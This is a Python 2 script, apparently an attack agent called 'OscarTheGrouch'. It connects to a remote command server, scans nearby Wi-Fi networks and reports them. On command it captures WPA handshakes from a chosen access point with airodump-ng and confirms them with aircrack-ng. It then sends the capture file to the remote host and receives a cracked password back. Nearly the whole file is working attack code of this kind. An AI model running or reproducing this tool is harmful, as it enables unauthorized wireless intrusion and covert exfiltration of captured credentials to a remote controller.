#!/usr/bin/env python
# written by opt1
# Thanks to Purehate for the tshark pcap extraction command line
    # - you made this hack possible

from socket import *
import sys, os, subprocess, time, thread

class oscar():
    def __init__(self):
        self.essid = 'x0'
        self.bssid = ''
        self.chan = 0
        self.encrypt = ''
        self.targetId = 'x0'
        self.ispcap = False
        self.pcapfile = 'filename'
        self.filename = 'filename-01.cap'
        self.crackPass = ''
	self.pcap = 'send.pcap'

def wifiscan(interface):
    try:
        p = subprocess.Popen(['iwlist', interface, 'scanning'], stdout=subprocess.PIPE)
        out, err = p.communicate()
        tmp = out.split('Cell')
        ap_list = []

        for line in tmp:
            tmpBssid = line.split('\n')[:1]
            tmpBssid = ''.join(tmpBssid).split(': ')[1:]
            bssid = ''.join(tmpBssid)

            tmpChan = line.split('\n')[1:2]
            tmpChan = ''.join(tmpChan).split(':')[1:]
            channel = ''.join(tmpChan)

            tmpEnc = line.split('\n')[4:5]
            tmpEnc = ''.join(tmpEnc).split(':')[1:]
            encrypt = ''.join(tmpEnc)

            tmpEssid = line.split('\n')[5:6]
            tmpEssid = ''.join(tmpEssid).split(':')[1:]
            essid = ''.join(tmpEssid)

            ap_list.append(essid+'/'+bssid+'/'+channel+'/'+encrypt)
        return ';'.join(ap_list)
    except:
        return False

def sendpcap(filename):
    pass

def Oscar(hostname, port, password, interface, mif, c, sleeper):
    try:
        time.sleep(sleeper)
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((hostname, int(port)))
        s.send('0x10')
        while True:

            #if ptr == 0:
            #    s.send('0x10')
            #    ptr +=1

            if (c.targetId != 'x0'):
                s.send('0x20')

            if c.ispcap:
                s.send('0x40')

            data = s.recv(2048)
            print 'data: '+str(data)+'\n'


            if '0x11' in data:
                s.send('0x12:'+password)

            if '0x14' in data:
                if c.targetId == 'x0':
                    if c.essid == 'x0':
                        s.send('0x30')

            if '0x21' in data:
                s.send('0x22:'+c.targetId)

            if '0x31' in data:
                ap_list = wifiscan(interface)
                s.send('0x32:'+ap_list)

            if '0x35' in data:
                s.send('0x25')
                data = data.split('0x35:')[1:]
                essidsort(c, ''.join(data))
                print 'essid: '+c.essid+'\t'+c.bssid+'\t'+c.chan+'\t'+c.encrypt+'\t'
                if 'off' in c.encrypt: 
                    #has no encryption do not start airodump, instead connect to the network and open vpn
                    #wifiConn(c, interface)
                    pass
                else:
                    thread.start_new_thread(airodump,(c, mif))
                    s.close()
                    if chckPcap(c):
                        c.ispcap = True

            if '0x41' in data:
                data = ''
                print 'sending file: '+c.filename+'\n'
                bufl = []
                pcapfile = open(c.filename, 'r')
                [bufl.append(item) for item in pcapfile.readlines()]
                pcapfile.close()
                buf = c.essid+'$x$'+str(''.join(bufl))+'$EOF$'
                s.send(buf)
                c.ispcap = False
                data = s.recv(2048)
                targetId = data.split(':')[1:]
                c.targetId = ''.join(targetId)
                print c.targetId+' ... targetId ...\n'

            if '0x24' in data:
                targetId = data.split(':')[1:]
            #save targetId to check back.

            if '0x50' in data:
                print 'going to sleep\n'
                time.sleep(10)
                s.close()

            #exit while loop and sleep.

            if '0x15' in data:
                c.crackPass = data.split(':')[1:]
            #open VPN connection
    except Exception, error:
        print "Error: "+str(error)+"\n"
        print 'Launching Oscar Again...\n'
	time.sleep(10)
        exit

def chckPcap(c):
    while True:
        if aircrack(c):
            if ripPcap(c):
		cleanup(c.filename, 1)
		time.sleep(1)
                return True
        #return info to main proccess that pcap is ready
        else:
            print 'chckPcap sleep'
            time.sleep(30)

def ripPcap(c):
    #thanks to PureHate for "tshark -r <input file> -R "eapol || wlan_mgt.tag.interpretation eq <essid> || (wlan.fc.type_subtype==0x08 && wlan_mgt.ssid eq <essid>)" -w <output file>"
    #change this to scan BSSID not ESSID. essid isn't always visible
    #subprocess.call(['tshark', '-r', c.filename, '-2R', '"eapol', '||', 'wlan_mgt.tag.interpretation', 'eq', c.essid, '||', '(wlan.fc.type_subtype==0x08', '&&', 'wlan_mgt.ssid', 'eq', c.essid, ')"', '-F', 'libpcap', '-w', c.pcap])

    #The Below works on T-shark version 1.10.1 and higher. UPGRADE your shit.
    #subprocess.call(['tshark', '-r', c.filename, '-F', 'libpcap', '-2R', '"eapol', '||', 'wlan.bssid', 'eq', c.bssid, '"', '-w', c.pcap])
    print 'tshark broken, skipping\n'
    return True

def cleanup(filename, option):
    try:
	if option == 1:
		subprocess.call(['killall', 'airodump-ng'])
	if option != 1:
		subprocess.call(['killall', 'airodump-ng'])
        os.remove(filename)
    except:
	pass

def essidsort(c, data):
    data = data.split('/')
    essid = data[0].split('"')[1:2]
    c.essid = ''.join(essid)
    c.bssid = data[1]
    c.chan = data[2]
    c.encrypt = data[3]

def aircrack(c):
    #p = subprocess.Popen(['aircrack-ng', '-a', '2', '-b', c.bssid, '-w', '/wordlists/wpa', c.filename], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # -a 2 requires a wordlist
    pcrack = subprocess.Popen(['aircrack-ng', c.filename], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = pcrack.communicate()
    pcrack.kill
    out = out.split('\n')
    for line in out:
        if 'WPA (1' in line:
            print 'Handshake Found!!! Return True!\n'
            return True
        elif 'WPA' in line:
            print 'WPA in line no handshake yet: '+str(line)+'\n'
            return False

def airodump(c, mif):
    print "airodump() started: airodump-ng --output-format pcap -w "+c.pcapfile+" -c "+c.chan+" --bssid "+c.bssid+" "+mif
    pdump = subprocess.Popen(['airodump-ng', '--output-format', 'pcap', '-w', c.pcapfile, '-c', c.chan, '--bssid', c.bssid, mif], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = pdump.communicate()

def usage():
    print "./OscarTheGrouch <hostname> <port> <password> <wireless interface> <monitor interface>"
    sys.exit(0)

def main():
    if len(sys.argv) < 6:
        usage()
    c = oscar()
    hostname = sys.argv[1]
    port = sys.argv[2]
    password = sys.argv[3]
    interface = sys.argv[4]
    mif = sys.argv[5]
    cleanup(c.filename, 2)
    while True:
        Oscar(hostname, port, password, interface, mif, c, 0)


if __name__ == "__main__":
    main()
